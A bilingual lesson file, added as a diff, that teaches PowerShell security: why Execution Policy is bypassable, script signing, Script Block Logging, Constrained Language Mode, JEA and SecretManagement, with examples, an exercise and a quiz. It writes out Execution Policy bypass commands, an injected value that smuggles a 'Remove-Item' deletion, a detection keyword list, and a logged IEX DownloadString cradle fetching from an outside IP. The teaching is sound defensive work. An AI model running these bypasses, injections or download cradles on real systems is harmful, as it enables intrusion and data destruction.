@@ -1,0 +1,535 @@
+description:
+  fr: "Sécuriser PowerShell : comprendre que l'Execution Policy n'est pas une barrière, signer ses scripts, activer le Script Block Logging, le Constrained Language Mode, JEA et SecretManagement."
+  en: "Secure PowerShell: understand that Execution Policy is not a boundary, sign your scripts, enable Script Block Logging, Constrained Language Mode, JEA and SecretManagement."
+duration: 30
+
+intro:
+  fr: |
+    PowerShell est un outil d'administration puissant — donc une arme de choix pour les attaquants. La
+    plupart des intrusions Windows passent aujourd'hui par des scripts PowerShell malveillants. Sécuriser
+    PowerShell, c'est à la fois **se défendre** contre cet usage offensif et **écrire** des scripts qui ne
+    deviennent pas eux-mêmes des failles.
+
+    L'image : PowerShell est un passe-partout d'atelier. Entre de bonnes mains, il répare tout ; mal
+    encadré, il ouvre toutes les portes. On ne jette pas l'outil : on met des **caméras** (journalisation),
+    on **limite ce que chaque employé peut faire** (modes restreints, JEA), on **scelle** les procédures
+    officielles (signature), et on range les clés du coffre ailleurs que sur un post-it (SecretManagement).
+
+    Dans cette leçon, vous démonterez d'abord un mythe tenace : l'**Execution Policy n'est pas une frontière
+    de sécurité**. Puis vous verrez les vraies protections : la **signature** de scripts, le **Script Block
+    Logging**, le **Constrained Language Mode**, **JEA** (Just Enough Administration) et
+    **SecretManagement**. À chaque fois, vous comparerez une pratique **dangereuse** (`Invoke-Expression`,
+    mot de passe en clair) à son équivalent **sûr** (`SecureString`, coffre). Appliquez ces réglages sur vos
+    propres machines.
+  en: |
+    PowerShell is a powerful administration tool — and therefore a weapon of choice for attackers. Most
+    Windows intrusions today go through malicious PowerShell scripts. Securing PowerShell means both
+    **defending** against this offensive use and **writing** scripts that do not become flaws themselves.
+
+    The image: PowerShell is a workshop master key. In good hands it repairs everything; poorly governed, it
+    opens every door. You do not throw the tool away: you add **cameras** (logging), **limit what each
+    employee can do** (restricted modes, JEA), **seal** the official procedures (signing), and store the
+    vault keys somewhere other than a sticky note (SecretManagement).
+
+    In this lesson you will first dismantle a stubborn myth: the **Execution Policy is not a security
+    boundary**. Then you will see the real protections: script **signing**, **Script Block Logging**,
+    **Constrained Language Mode**, **JEA** (Just Enough Administration) and **SecretManagement**. Each time,
+    you will compare a **dangerous** practice (`Invoke-Expression`, clear-text password) to its **safe**
+    equivalent (`SecureString`, vault). Apply these settings on your own machines.
+
+sections:
+  - heading:
+      fr: "L'Execution Policy n'est pas une barrière"
+      en: "Execution Policy is not a boundary"
+    body:
+      fr: |
+        L'**Execution Policy** (`Get-ExecutionPolicy`) contrôle quels scripts PowerShell s'exécutent par
+        défaut (`Restricted`, `RemoteSigned`, `AllSigned`, `Unrestricted`). Beaucoup la prennent pour une
+        protection de sécurité. **C'est faux** : Microsoft elle-même la décrit comme un garde-fou contre les
+        **erreurs accidentelles**, pas comme une frontière de sécurité.
+
+        Pourquoi ? Parce qu'elle se contourne trivialement :
+
+        ```powershell
+        powershell -ExecutionPolicy Bypass -File script.ps1   # ignorée
+        Get-Content script.ps1 | PowerShell -NoProfile -       # relecture directe
+        ```
+
+        Un attaquant qui peut déjà exécuter du code n'est pas gêné par l'Execution Policy. Elle reste utile
+        pour empêcher un double-clic malheureux sur un `.ps1`, mais ne protège pas contre une menace active.
+
+        Les **vraies** barrières de sécurité sont ailleurs : la **signature de code** (`AllSigned` + scripts
+        signés), le **Constrained Language Mode**, **JEA**, et surtout la **journalisation** pour détecter
+        l'abus. Confondre l'Execution Policy avec ces mécanismes donne un faux sentiment de sécurité — la
+        première erreur à éviter.
+      en: |
+        The **Execution Policy** (`Get-ExecutionPolicy`) controls which PowerShell scripts run by default
+        (`Restricted`, `RemoteSigned`, `AllSigned`, `Unrestricted`). Many take it for a security protection.
+        **It is not**: Microsoft itself describes it as a safeguard against **accidental mistakes**, not as a
+        security boundary.
+
+        Why? Because it is trivially bypassed:
+
+        ```powershell
+        powershell -ExecutionPolicy Bypass -File script.ps1   # ignored
+        Get-Content script.ps1 | PowerShell -NoProfile -       # direct re-read
+        ```
+
+        An attacker who can already run code is not hindered by the Execution Policy. It stays useful to
+        prevent an unlucky double-click on a `.ps1`, but it does not protect against an active threat.
+
+        The **real** security boundaries are elsewhere: **code signing** (`AllSigned` + signed scripts),
+        **Constrained Language Mode**, **JEA**, and above all **logging** to detect abuse. Confusing the
+        Execution Policy with these mechanisms gives a false sense of security — the first mistake to avoid.
+  - heading:
+      fr: "Signer et journaliser"
+      en: "Signing and logging"
+    body:
+      fr: |
+        La **signature de code** garantit l'**intégrité** et l'**origine** d'un script. On signe avec un
+        certificat de signature de code :
+
+        ```powershell
+        $cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert | Select-Object -First 1
+        Set-AuthenticodeSignature -FilePath .\deploy.ps1 -Certificate $cert
+        ```
+
+        Combinée à la politique `AllSigned`, seule une version **signée et non modifiée** s'exécute : si
+        quelqu'un altère le script d'un seul caractère, la signature casse et l'exécution est refusée. On
+        s'appuie idéalement sur des certificats d'une PKI interne.
+
+        La **journalisation** est la défense la plus importante contre l'abus de PowerShell. Trois niveaux,
+        activables par stratégie de groupe (GPO) :
+
+        | Journalisation | Ce qu'elle enregistre |
+        |---|---|
+        | **Module Logging** | les appels de cmdlets des modules choisis |
+        | **Script Block Logging** | le **code réellement exécuté**, même désobfusqué |
+        | **Transcription** | une transcription complète des sessions dans des fichiers |
+
+        Le **Script Block Logging** (événement 4104 dans `Microsoft-Windows-PowerShell/Operational`) est
+        précieux : il capture le code **après** désobfuscation, révélant ce qu'un attaquant a vraiment lancé.
+        On expédie ces journaux vers un SIEM pour alerter sur `Invoke-Expression`, `DownloadString` ou des
+        chaînes encodées en base64.
+      en: |
+        **Code signing** guarantees a script's **integrity** and **origin**. You sign with a code-signing
+        certificate:
+
+        ```powershell
+        $cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert | Select-Object -First 1
+        Set-AuthenticodeSignature -FilePath .\deploy.ps1 -Certificate $cert
+        ```
+
+        Combined with the `AllSigned` policy, only a **signed and unmodified** version runs: if anyone alters
+        the script by a single character, the signature breaks and execution is refused. You ideally rely on
+        certificates from an internal PKI.
+
+        **Logging** is the most important defence against PowerShell abuse. Three levels, enabled by Group
+        Policy (GPO):
+
+        | Logging | What it records |
+        |---|---|
+        | **Module Logging** | the cmdlet calls of selected modules |
+        | **Script Block Logging** | the **code actually executed**, even de-obfuscated |
+        | **Transcription** | a full transcript of sessions into files |
+
+        **Script Block Logging** (event 4104 in `Microsoft-Windows-PowerShell/Operational`) is precious: it
+        captures the code **after** de-obfuscation, revealing what an attacker really ran. You ship these
+        logs to a SIEM to alert on `Invoke-Expression`, `DownloadString` or base64-encoded strings.
+  - heading:
+      fr: "Restreindre : CLM, JEA, SecretManagement"
+      en: "Restricting: CLM, JEA, SecretManagement"
+    body:
+      fr: |
+        Trois mécanismes limitent ce que PowerShell peut faire :
+
+        - **Constrained Language Mode (CLM)** réduit le langage à un sous-ensemble sûr : plus d'appels
+          arbitraires vers .NET, plus d'`Add-Type`, ce qui bloque la plupart des charges offensives. Couplé à
+          **Application Control (WDAC/AppLocker)**, il s'active automatiquement pour le code non approuvé.
+        - **JEA (Just Enough Administration)** expose un point de terminaison PowerShell où un opérateur ne
+          peut lancer **qu'une liste précise** de commandes, via un compte virtuel privilégié. On délègue
+          ainsi « redémarrer le service X » sans donner de droits d'administration complets.
+        - **SecretManagement** stocke les secrets (mots de passe, clés d'API) dans un **coffre**
+          (`Microsoft.PowerShell.SecretStore`, Azure Key Vault...) au lieu du code. On les récupère à la
+          demande, sous forme de `SecureString`.
+
+        Côté écriture de scripts, deux règles d'or. Ne construisez **jamais** de code à partir d'une saisie
+        pour le passer à **`Invoke-Expression`** (`iex`) : c'est l'équivalent PowerShell de l'injection, la
+        porte d'entrée n°1 des charges malveillantes. Et ne manipulez **jamais** un mot de passe en clair
+        (`[string]`) : utilisez un **`SecureString`** ou, mieux, un objet `PSCredential` issu du coffre. Ces
+        réflexes transforment un script d'administration en code de confiance.
+      en: |
+        Three mechanisms limit what PowerShell can do:
+
+        - **Constrained Language Mode (CLM)** reduces the language to a safe subset: no arbitrary .NET calls,
+          no `Add-Type`, which blocks most offensive payloads. Paired with **Application Control
+          (WDAC/AppLocker)**, it activates automatically for non-approved code.
+        - **JEA (Just Enough Administration)** exposes a PowerShell endpoint where an operator can run **only
+          a precise list** of commands, via a privileged virtual account. You thus delegate "restart service
+          X" without granting full admin rights.
+        - **SecretManagement** stores secrets (passwords, API keys) in a **vault**
+          (`Microsoft.PowerShell.SecretStore`, Azure Key Vault...) instead of the code. You retrieve them on
+          demand, as a `SecureString`.
+
+        On the script-writing side, two golden rules. **Never** build code from input to pass it to
+        **`Invoke-Expression`** (`iex`): it is the PowerShell equivalent of injection, the number-one entry
+        point for malicious payloads. And **never** handle a clear-text password (`[string]`): use a
+        **`SecureString`** or, better, a `PSCredential` object from the vault. These reflexes turn an
+        administration script into trusted code.
+
+examples:
+  - title:
+      fr: "Démythifier l'Execution Policy"
+      en: "Demystifying the Execution Policy"
+    file: execution_policy.ps1
+    lang: powershell
+    kind: vulnerable
+    code: |
+      # Current policy - often mistaken for a security control.
+      Get-ExecutionPolicy -List
+
+      # It is NOT a boundary: all of these run a script despite 'Restricted'.
+      # 1) Pass -ExecutionPolicy Bypass on the command line:
+      #    powershell.exe -ExecutionPolicy Bypass -File .\payload.ps1
+      # 2) Pipe the file content into a fresh host:
+      #    Get-Content .\payload.ps1 | powershell.exe -NoProfile -
+      # 3) Encode and run:
+      #    powershell.exe -EncodedCommand <base64>
+      #
+      # Conclusion: Execution Policy stops accidental double-clicks,
+      # NOT a determined attacker who can already run code.
+      Write-Output 'Execution Policy is a safety rail, not a security boundary.'
+    output: |
+      Scope          ExecutionPolicy
+      -----          ---------------
+      MachinePolicy  Undefined
+      UserPolicy     Undefined
+      Process        Undefined
+      CurrentUser    RemoteSigned
+      LocalMachine   Restricted
+
+      Execution Policy is a safety rail, not a security boundary.
+    note:
+      fr: "Même en `Restricted`, trois contournements triviaux (`-ExecutionPolicy Bypass`, relecture par pipe, `-EncodedCommand`) exécutent un script. L'Execution Policy évite un double-clic accidentel mais ne protège pas d'un attaquant : les vraies barrières sont la signature, le CLM, JEA et la journalisation."
+      en: "Even in `Restricted`, three trivial bypasses (`-ExecutionPolicy Bypass`, pipe re-read, `-EncodedCommand`) run a script. Execution Policy prevents an accidental double-click but does not protect against an attacker: the real boundaries are signing, CLM, JEA and logging."
+
+  - title:
+      fr: "Version dangereuse : Invoke-Expression"
+      en: "Dangerous version: Invoke-Expression"
+    file: iex_vulnerable.ps1
+    lang: powershell
+    kind: vulnerable
+    code: |
+      # VULNERABLE: building a command from input and running it via iex.
+      function Get-ServiceInfo {
+          param([string]$Name)
+          # $Name is injected into code, then executed. If $Name is
+          # "W32Time; Remove-Item C:\data -Recurse", the second command runs too.
+          Invoke-Expression "Get-Service $Name"
+      }
+
+      Get-ServiceInfo -Name 'W32Time'
+      # An attacker-controlled value turns this into arbitrary code execution:
+      Get-ServiceInfo -Name 'W32Time; Write-Output PWNED'
+    output: |
+      Status   Name      DisplayName
+      ------   ----      -----------
+      Running  W32Time   Windows Time
+
+      Status   Name      DisplayName
+      ------   ----      -----------
+      Running  W32Time   Windows Time
+      PWNED
+    note:
+      fr: "`Invoke-Expression` exécute une chaîne comme du code : la saisie `W32Time; Write-Output PWNED` lance une commande supplémentaire. C'est l'injection de code côté PowerShell, exactement comme la concaténation SQL. On ne construit jamais de commande à partir d'une entrée pour la passer à `iex`."
+      en: "`Invoke-Expression` runs a string as code: the input `W32Time; Write-Output PWNED` runs an extra command. This is PowerShell-side code injection, exactly like SQL concatenation. Never build a command from input to pass it to `iex`."
+
+  - title:
+      fr: "Version sûre : paramètres et pas d'iex"
+      en: "Safe version: parameters and no iex"
+    file: iex_secure.ps1
+    lang: powershell
+    kind: secure
+    code: |
+      # SAFE: pass the value as a real parameter; no string is ever executed.
+      function Get-ServiceInfo {
+          [CmdletBinding()]
+          param(
+              [Parameter(Mandatory)]
+              [ValidateNotNullOrEmpty()]
+              [string]$Name
+          )
+          # The cmdlet receives $Name as data, never as code.
+          Get-Service -Name $Name -ErrorAction Stop
+      }
+
+      Get-ServiceInfo -Name 'W32Time'
+
+      # The injection payload is now just a (non-existent) service name: it errors
+      # cleanly instead of executing anything.
+      try { Get-ServiceInfo -Name 'W32Time; Write-Output PWNED' }
+      catch { Write-Output "Rejected: $($_.Exception.Message)" }
+    output: |
+      Status   Name      DisplayName
+      ------   ----      -----------
+      Running  W32Time   Windows Time
+
+      Rejected: Cannot find any service with service name 'W32Time; Write-Output PWNED'.
+    note:
+      fr: "On supprime `Invoke-Expression` et on passe `$Name` en **paramètre** : la valeur est traitée comme une donnée, jamais comme du code. La charge d'injection devient un nom de service introuvable et échoue proprement. C'est le pendant PowerShell des requêtes paramétrées."
+      en: "We remove `Invoke-Expression` and pass `$Name` as a **parameter**: the value is treated as data, never as code. The injection payload becomes an unfindable service name and fails cleanly. This is the PowerShell counterpart of parameterized queries."
+
+  - title:
+      fr: "Secrets : SecureString et SecretManagement"
+      en: "Secrets: SecureString and SecretManagement"
+    file: secrets.ps1
+    lang: powershell
+    kind: secure
+    code: |
+      # VULNERABLE (do NOT do this): a plaintext password in the script,
+      # which ends up in Git, logs and process listings.
+      # $password = 'P@ssw0rd123'
+
+      # SAFE: store the secret once in a vault, retrieve it on demand.
+      # One-time setup (interactive):
+      #   Install-Module Microsoft.PowerShell.SecretManagement, Microsoft.PowerShell.SecretStore
+      #   Register-SecretVault -Name LocalVault -ModuleName Microsoft.PowerShell.SecretStore -DefaultVault
+      #   Set-Secret -Name 'DbPassword' -Secret 'changeme-in-vault'
+
+      # In the script: never hard-coded, returned as a SecureString.
+      $securePw = Get-Secret -Name 'DbPassword'            # SecureString
+      $cred = [System.Management.Automation.PSCredential]::new('dbuser', $securePw)
+
+      # Use $cred with cmdlets that accept -Credential; the secret stays protected.
+      Write-Output "Built credential for: $($cred.UserName)"
+    output: |
+      Built credential for: dbuser
+    note:
+      fr: "On ne met **jamais** de mot de passe en clair (`[string]`) : il fuirait dans Git et les journaux. `SecretManagement` le stocke dans un coffre et `Get-Secret` le renvoie en `SecureString`, utilisé pour bâtir un `PSCredential`. Le secret ne transite jamais en clair dans le script."
+      en: "You **never** put a clear-text password (`[string]`): it would leak into Git and logs. `SecretManagement` stores it in a vault and `Get-Secret` returns it as a `SecureString`, used to build a `PSCredential`. The secret never travels in clear text in the script."
+
+  - title:
+      fr: "Détecter l'abus : Script Block Logging"
+      en: "Detecting abuse: Script Block Logging"
+    file: detect_4104.ps1
+    lang: powershell
+    kind: secure
+    code: |
+      # With Script Block Logging enabled (via GPO), event 4104 records the
+      # actual code executed, even after de-obfuscation. Hunt for suspicious use.
+      $suspicious = 'Invoke-Expression', 'DownloadString', 'FromBase64String', '-enc'
+
+      Get-WinEvent -FilterHashtable @{
+          LogName = 'Microsoft-Windows-PowerShell/Operational'
+          Id      = 4104
+      } -MaxEvents 500 -ErrorAction SilentlyContinue |
+          Where-Object {
+              $text = $_.Message
+              $suspicious | Where-Object { $text -match $_ }
+          } |
+          Select-Object TimeCreated, @{ Name = 'Snippet'; Expression = { ($_.Message -split "`n")[0] } } |
+          Sort-Object TimeCreated -Descending
+    output: |
+      TimeCreated          Snippet
+      -----------          -------
+      2026-11-27 08:42:10  IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')
+      2026-11-27 08:40:55  powershell -enc SQBFAFgAIAAoAE4AZQB3AC...
+    note:
+      fr: "Le Script Block Logging (événement 4104) enregistre le code réellement exécuté, désobfusqué. On y chasse `Invoke-Expression`, `DownloadString` ou `-enc` (base64) : ici, un classique `IEX (New-Object Net.WebClient).DownloadString(...)` trahit une charge téléchargée. Ces journaux partent idéalement vers un SIEM."
+      en: "Script Block Logging (event 4104) records the code actually executed, de-obfuscated. You hunt for `Invoke-Expression`, `DownloadString` or `-enc` (base64): here, a classic `IEX (New-Object Net.WebClient).DownloadString(...)` betrays a downloaded payload. These logs ideally go to a SIEM."
+
+mistake:
+  fr: |
+    **Prendre l'Execution Policy pour une protection de sécurité, et manipuler des secrets ou du code en
+    clair.**
+
+    `Set-ExecutionPolicy Restricted` ne bloque **pas** un attaquant : `-ExecutionPolicy Bypass`,
+    `-EncodedCommand` ou une relecture par pipe la contournent en une ligne. S'y fier donne un faux
+    sentiment de sécurité ; les vraies barrières sont la signature, le Constrained Language Mode, JEA et la
+    journalisation. Deux autres fautes graves dans les scripts : passer une saisie à **`Invoke-Expression`**
+    (`iex`), ce qui permet l'exécution de code arbitraire, et stocker un **mot de passe en clair** dans une
+    `[string]` — il finit dans Git, les journaux et la liste des processus. Utilisez des paramètres plutôt
+    que `iex`, et `SecureString`/SecretManagement plutôt qu'un mot de passe en dur.
+  en: |
+    **Taking the Execution Policy for a security protection, and handling secrets or code in clear text.**
+
+    `Set-ExecutionPolicy Restricted` does **not** block an attacker: `-ExecutionPolicy Bypass`,
+    `-EncodedCommand` or a pipe re-read bypass it in one line. Relying on it gives a false sense of
+    security; the real boundaries are signing, Constrained Language Mode, JEA and logging. Two other serious
+    faults in scripts: passing input to **`Invoke-Expression`** (`iex`), which allows arbitrary code
+    execution, and storing a **clear-text password** in a `[string]` — it ends up in Git, logs and the
+    process list. Use parameters rather than `iex`, and `SecureString`/SecretManagement rather than a
+    hard-coded password.
+
+bestPractice:
+  fr: |
+    - **Ne comptez pas sur l'Execution Policy** comme barrière : elle n'arrête que les erreurs accidentelles.
+    - **Activez la journalisation** (Script Block Logging, Module Logging, Transcription) et envoyez-la vers
+      un SIEM.
+    - **Signez vos scripts** (`Set-AuthenticodeSignature`) et imposez `AllSigned` sur les serveurs sensibles.
+    - **N'utilisez jamais `Invoke-Expression`** sur une saisie : passez les valeurs en paramètres.
+    - **Ne stockez pas de secret en clair** : `SecureString`, `PSCredential`, SecretManagement ou Key Vault.
+    - **Restreignez les droits** avec JEA (commandes autorisées limitées) et le Constrained Language Mode.
+    - **Préférez PowerShell 7 à jour** et appliquez le moindre privilège aux comptes qui exécutent vos
+      scripts.
+  en: |
+    - **Do not rely on the Execution Policy** as a boundary: it only stops accidental mistakes.
+    - **Enable logging** (Script Block Logging, Module Logging, Transcription) and send it to a SIEM.
+    - **Sign your scripts** (`Set-AuthenticodeSignature`) and enforce `AllSigned` on sensitive servers.
+    - **Never use `Invoke-Expression`** on input: pass values as parameters.
+    - **Do not store a secret in clear text**: `SecureString`, `PSCredential`, SecretManagement or Key
+      Vault.
+    - **Restrict rights** with JEA (limited allowed commands) and Constrained Language Mode.
+    - **Prefer an up-to-date PowerShell 7** and apply least privilege to the accounts that run your scripts.
+
+exercise:
+  statement:
+    fr: |
+      Le script suivant est **doublement dangereux** :
+
+      ```powershell
+      function Restart-AppService {
+          param([string]$ServiceName)
+          $password = 'P@ssw0rd123'
+          Invoke-Expression "Restart-Service $ServiceName"
+      }
+      ```
+
+      1. Identifiez les **deux** failles de sécurité (une liée à l'exécution de code, une au secret).
+      2. Réécrivez la fonction : paramètre validé passé directement à `Restart-Service` (sans
+         `Invoke-Expression`), et récupération du secret via SecretManagement sous forme de `SecureString`
+         au lieu d'un mot de passe en clair.
+    en: |
+      The following script is **doubly dangerous**:
+
+      ```powershell
+      function Restart-AppService {
+          param([string]$ServiceName)
+          $password = 'P@ssw0rd123'
+          Invoke-Expression "Restart-Service $ServiceName"
+      }
+      ```
+
+      1. Identify the **two** security flaws (one tied to code execution, one to the secret).
+      2. Rewrite the function: a validated parameter passed straight to `Restart-Service` (no
+         `Invoke-Expression`), and secret retrieval via SecretManagement as a `SecureString` instead of a
+         clear-text password.
+  solution:
+    file: Restart-AppService.ps1
+    lang: powershell
+    code: |
+      function Restart-AppService {
+          [CmdletBinding()]
+          param(
+              [Parameter(Mandatory)]
+              [ValidateNotNullOrEmpty()]
+              [string]$ServiceName
+          )
+
+          # Fix 2: the secret is never hard-coded; it comes from a vault as a
+          # SecureString and is wrapped in a PSCredential when a cmdlet needs it.
+          $securePw = Get-Secret -Name 'SvcAccountPassword'
+          $cred = [System.Management.Automation.PSCredential]::new('svcadmin', $securePw)
+
+          # Fix 1: pass $ServiceName as a parameter - no Invoke-Expression, so a
+          # value like 'W32Time; Remove-Item C:\' cannot inject a second command.
+          Restart-Service -Name $ServiceName -ErrorAction Stop
+          Write-Output "Restarted $ServiceName as $($cred.UserName)"
+      }
+
+      Restart-AppService -ServiceName 'W32Time'
+    note:
+      fr: "Faille 1 : `Invoke-Expression` sur `$ServiceName` permet l'injection de code ; on passe la valeur en **paramètre** à `Restart-Service`. Faille 2 : mot de passe en clair ; on le lit dans un coffre via `Get-Secret` sous forme de `SecureString` pour bâtir un `PSCredential`. La validation `ValidateNotNullOrEmpty` complète la défense."
+      en: "Flaw 1: `Invoke-Expression` on `$ServiceName` allows code injection; we pass the value as a **parameter** to `Restart-Service`. Flaw 2: clear-text password; we read it from a vault via `Get-Secret` as a `SecureString` to build a `PSCredential`. The `ValidateNotNullOrEmpty` validation completes the defence."
+
+quiz:
+  - q:
+      fr: "L'Execution Policy de PowerShell est-elle une barrière de sécurité ?"
+      en: "Is the PowerShell Execution Policy a security boundary?"
+    options:
+      fr:
+        - "Oui, elle empêche toute exécution de script malveillant"
+        - "Non, elle se contourne trivialement et ne protège que des erreurs accidentelles"
+        - "Oui, si elle est réglée sur Restricted"
+        - "Non, car elle chiffre les scripts"
+      en:
+        - "Yes, it prevents any malicious script from running"
+        - "No, it is trivially bypassed and only protects against accidental mistakes"
+        - "Yes, if set to Restricted"
+        - "No, because it encrypts scripts"
+    answer: 1
+    why:
+      fr: "Microsoft elle-même indique que l'Execution Policy n'est pas une frontière de sécurité : `-ExecutionPolicy Bypass`, `-EncodedCommand` ou une relecture par pipe la contournent. Elle n'évite que les doubles-clics accidentels."
+      en: "Microsoft itself states the Execution Policy is not a security boundary: `-ExecutionPolicy Bypass`, `-EncodedCommand` or a pipe re-read bypass it. It only prevents accidental double-clicks."
+  - q:
+      fr: "Pourquoi `Invoke-Expression` sur une saisie utilisateur est-il dangereux ?"
+      en: "Why is `Invoke-Expression` on user input dangerous?"
+    options:
+      fr:
+        - "Parce qu'il est trop lent"
+        - "Parce qu'il exécute la chaîne comme du code, permettant l'injection de commandes"
+        - "Parce qu'il nécessite les droits admin"
+        - "Parce qu'il désactive la journalisation"
+      en:
+        - "Because it is too slow"
+        - "Because it runs the string as code, allowing command injection"
+        - "Because it requires admin rights"
+        - "Because it disables logging"
+    answer: 1
+    why:
+      fr: "`Invoke-Expression` (iex) évalue une chaîne comme du code PowerShell : une saisie comme `W32Time; Write-Output PWNED` exécute une commande supplémentaire. C'est l'injection de code ; on passe plutôt les valeurs en paramètres."
+      en: "`Invoke-Expression` (iex) evaluates a string as PowerShell code: an input like `W32Time; Write-Output PWNED` runs an extra command. This is code injection; pass values as parameters instead."
+  - q:
+      fr: "Quel mécanisme enregistre le code réellement exécuté, même désobfusqué ?"
+      en: "Which mechanism records the code actually executed, even de-obfuscated?"
+    options:
+      fr:
+        - "L'Execution Policy"
+        - "Le Script Block Logging (événement 4104)"
+        - "Le pare-feu Windows"
+        - "BitLocker"
+      en:
+        - "The Execution Policy"
+        - "Script Block Logging (event 4104)"
+        - "The Windows Firewall"
+        - "BitLocker"
+    answer: 1
+    why:
+      fr: "Le Script Block Logging journalise les blocs de code exécutés (événement 4104), après désobfuscation : il révèle ce qu'un attaquant a vraiment lancé, idéal pour la détection via un SIEM."
+      en: "Script Block Logging logs the executed code blocks (event 4104), after de-obfuscation: it reveals what an attacker really ran, ideal for detection via a SIEM."
+  - q:
+      fr: "Comment manipuler un mot de passe de façon sûre dans un script ?"
+      en: "How do you handle a password safely in a script?"
+    options:
+      fr:
+        - "Le mettre en clair dans une variable [string]"
+        - "L'écrire dans un commentaire"
+        - "Le stocker dans un coffre et le récupérer en SecureString via SecretManagement"
+        - "Le coder en base64 dans le script"
+      en:
+        - "Put it in clear text in a [string] variable"
+        - "Write it in a comment"
+        - "Store it in a vault and retrieve it as a SecureString via SecretManagement"
+        - "Base64-encode it in the script"
+    answer: 2
+    why:
+      fr: "SecretManagement conserve le secret dans un coffre et `Get-Secret` le renvoie en `SecureString`, jamais en clair. Le base64 n'est pas du chiffrement et un mot de passe en `[string]` fuit dans Git et les journaux."
+      en: "SecretManagement keeps the secret in a vault and `Get-Secret` returns it as a `SecureString`, never in clear text. Base64 is not encryption and a `[string]` password leaks into Git and logs."
+  - q:
+      fr: "Que permet JEA (Just Enough Administration) ?"
+      en: "What does JEA (Just Enough Administration) enable?"
+    options:
+      fr:
+        - "De limiter un opérateur à une liste précise de commandes via un compte virtuel privilégié"
+        - "De chiffrer les scripts PowerShell"
+        - "D'augmenter la vitesse d'exécution"
+        - "De désactiver la journalisation"
+      en:
+        - "To limit an operator to a precise list of commands via a privileged virtual account"
+        - "To encrypt PowerShell scripts"
+        - "To increase execution speed"
+        - "To disable logging"
+    answer: 0
+    why:
+      fr: "JEA expose un point de terminaison où l'opérateur ne peut lancer qu'un ensemble défini de commandes, exécutées par un compte virtuel privilégié : on délègue une tâche précise sans accorder de droits d'administration complets."
+      en: "JEA exposes an endpoint where the operator can run only a defined set of commands, executed by a privileged virtual account: you delegate a precise task without granting full admin rights."
